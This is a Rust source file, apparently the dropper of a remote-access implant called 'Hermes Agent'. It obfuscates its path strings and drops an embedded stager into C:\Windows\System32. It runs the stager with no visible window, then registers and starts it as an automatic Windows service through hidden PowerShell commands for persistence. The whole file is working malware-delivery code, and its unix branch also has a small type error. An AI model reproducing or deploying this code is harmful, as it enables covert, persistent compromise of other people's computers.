#![windows_subsystem = "windows"]
#[cfg(feature = "windows-service")]
use std::os::windows::process::CommandExt as _;
use std::{fs, process};

pub const CREATE_NO_WINDOW: u32 = 0x08000000;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(unix)]
    {
        eprintln!("This platform is not supported");
        return;
    }

    #[cfg(feature = "windows-service")]
    fs::write(
        obfstr::obfstr!("C:\\Windows\\System32\\agent.exe"),
        include_bytes!(concat!(env!("OUT_DIR"), "/stager.exe")),
    )?;
    #[cfg(not(feature = "windows-service"))]
    fs::write(
        obfstr::obfstr!("agent.exe"),
        include_bytes!(concat!(env!("OUT_DIR"), "/stager.exe")),
    )?;

    // Execute stager
    #[cfg(feature = "windows-service")]
    process::Command::new(obfstr::obfstr!("C:\\Windows\\System32\\agent.exe"))
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()?
        .wait()?;
    #[cfg(not(feature = "windows-service"))]
    println!(
        "{:#?}",
        process::Command::new(obfstr::obfstr!("agent.exe"))
            .spawn()?
            .wait()?
    );

    // TODO Implement multiple persistence methods
    #[cfg(feature = "windows-service")]
    {
        process::Command::new("powershell")
            .creation_flags(CREATE_NO_WINDOW)
            .arg("-Command")
            .arg("New-Service")
            .arg("-Name")
            .arg("'Agent'")
            .arg("-BinaryPathName")
            .arg("'C:\\Windows\\System32\\agent.exe'")
            .arg("-DisplayName")
            .arg("'Agent'")
            .arg("-StartupType")
            .arg("Automatic")
            .arg("-Description")
            .arg("'Hermes Agent Service'")
            .status()
            .expect("Failed to create service");
        process::Command::new("powershell")
            .creation_flags(CREATE_NO_WINDOW)
            .arg("-Command")
            .arg("Start-Service")
            .arg("-Name")
            .arg("'Agent'")
            .status()
            .expect("Failed to start service");
    }
    Ok(())
}
